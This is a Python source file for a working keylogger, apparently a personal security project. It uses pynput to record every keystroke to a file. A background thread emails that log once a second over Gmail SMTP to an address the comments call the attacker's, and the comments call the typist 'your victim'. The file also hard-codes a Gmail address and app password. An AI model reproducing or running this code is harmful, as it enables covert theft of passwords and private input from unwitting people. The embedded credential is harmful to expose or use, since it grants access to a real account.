
from email.mime.multipart import MIMEMultipart #for email
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import time
import threading


from pynput.keyboard import Key, Listener #listener listens for keys, key logs keys


keys_textfile = "key_log.txt"
file_path = "/Users/dimplesingh/projects/Documents/playground-python/cyber_sec/keylogger/project" # Enter the file path you want your files to be saved to
extend = "/" #for accessing key_log.txt file
count =0
keys=[]



#below for emailing the file key_log.txt to your attacker so that he gets access to your keystrokes

email_address = "bingstudent0@gmail.com" # disposable email 
password = "osdpkriqgzsziayf" #the app password as google has diabled the direct smtp usage due to security issues

toaddr = "bingstudent0@gmail.com" # Enter the email address you want to send your information to 


file_merge = file_path + extend #path for the file in which you will write the keystrokes

# email controls
def send_email(filename, attachment, toaddr):
    
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Key Log" #subject of the email

    body = "Find the attached file for the key entered by your victim" #body of email

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb') #rb is read binary

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read()) #encoding the msg

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls() #starting the connection here

    s.login(fromaddr, password) #your id password is entered to login

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

#send_email(keys_textfile, file_path + extend + keys_textfile, toaddr)


def on_press(key):
    global keys,count
    #print(key) #prints on the terminal
    keys.append(key)
    #print(keys)
    count +=1
    if count>=1:
        count=0
        write_to_file(keys)
        keys=[]

def write_to_file(keys):
    with open(file_path + extend+ keys_textfile, "a") as f: #appending into file
        #print(f)
        for key in keys:
            k= str(key).replace("'","")
            if k.find("space")>0:
                f.write("\n")
                f.close()
            elif k.find("enter")>0:
                f.write("\nenter was pressed ")
                f.close()
            elif k.find("Key")==-1:
                f.write(k)
                f.close()
            
def email_intervals(keys_textfile, file_path, extend,toaddr):
    while not stop_thread:
        send_email(keys_textfile, file_path + extend + keys_textfile, toaddr)
        time.sleep(1)
def on_release(key):
    global stop_thread
    if key==Key.esc:
        stop_thread= True
        return False

stop_thread=False
#implemented threads so that it sends email in parallel while it is writing into the file
email_thread = threading.Thread(target=email_intervals, args=(keys_textfile, file_path, extend, toaddr))
email_thread.start()

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
